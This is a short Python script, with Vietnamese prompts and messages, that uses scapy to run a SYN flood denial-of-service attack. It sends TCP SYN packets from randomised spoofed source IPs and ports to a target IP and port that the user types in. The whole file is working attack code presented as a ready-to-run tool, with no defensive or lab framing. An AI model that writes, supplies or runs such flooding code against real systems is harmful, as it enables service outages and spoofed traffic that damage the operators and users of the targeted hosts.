from scapy.all import IP, TCP, send, RandShort, RandIP
import time

def syn_flood(target_ip, target_port, packet_count=100):
    print(f"[+] Bắt đầu SYN Flood tới {target_ip}:{target_port}")
    for i in range(packet_count):
        ip_layer = IP(src=RandIP(), dst=target_ip)
        tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="S")
        packet = ip_layer / tcp_layer
        send(packet, verbose=False)
        print(f"[{i+1}/{packet_count}] Gửi SYN từ {ip_layer.src} → {target_ip}:{target_port}")
        # time.sleep(0.01)  # Bỏ comment để giảm tốc độ

    print("[+] Hoàn tất SYN Flood")

if __name__ == "__main__":
    target = input("Nhập IP đích: ").strip()
    port = int(input("Nhập port đích (VD: 80): ").strip())
    count = int(input("Số lượng gói muốn gửi (VD: 1000): ").strip())

    syn_flood(target, port, count)
